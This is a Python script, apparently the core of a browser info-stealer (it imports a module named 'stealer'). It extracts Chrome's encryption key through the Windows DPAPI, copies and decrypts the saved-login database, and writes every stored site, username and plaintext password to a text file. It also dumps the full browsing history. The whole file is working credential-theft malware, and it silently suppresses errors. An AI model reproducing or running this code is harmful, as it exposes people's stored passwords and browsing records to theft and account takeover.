import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import stealer

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                "AppData", "Local","Google",
                                "Chrome", "User Data", "Local State")
    
    with open(local_state_path, "r", encoding='utf-8') as f:
        loacal_state = f.read()
        loacal_state = json.loads(loacal_state)

    key = base64.b64decode(loacal_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None,None,0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM ,iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        

def get_chrome_datetim(chrome_data):
    return datetime(1601, 1,1) + timedelta(microseconds=chrome_data)

def get_chrome_history():
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default",
                            "History")
        temp_db_path = "C:\\Users\\{}\\AppData\\Local\\Temp\\HistoryTemp".format(os.getlogin())
        shutil.copyfile(db_path, temp_db_path)
        connection = sqlite3.connect(temp_db_path)
        cursor = connection.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        history_entries = []
        for row in cursor.fetchall():
            url, title, last_visit_time = row
            last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit_time)
            history_entries.append({"url": url, "title": title, "last_visit_time": last_visit_time})

        for entry in history_entries: 
            url = entry['url']
            title = entry['title']
            last_vt = str(entry['last_visit_time'])
            stealer.write_history("C:\\Min\\GoogleChr\\historyGoogle.txt", url, title, last_vt)

    except sqlite3.Error as e:
        print("SQLite error:", e)

    finally:
        if connection:
            connection.close()
        try:
            os.remove(temp_db_path)
        except OSError as e:
            print("Error deleting temporary database:", e)

def main():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"],"AppData","Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value,"
                    "password_value FROM logins ORDER BY date_created")

        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            if username or password:
                stealer.write_to_file("C:\\Min\\GoogleChr\\passwords.txt", origin_url, action_url, username, password)
        cursor.close()
        db.close()
    except:
        pass
    try:
        os.remove(filename)
    except:
        pass


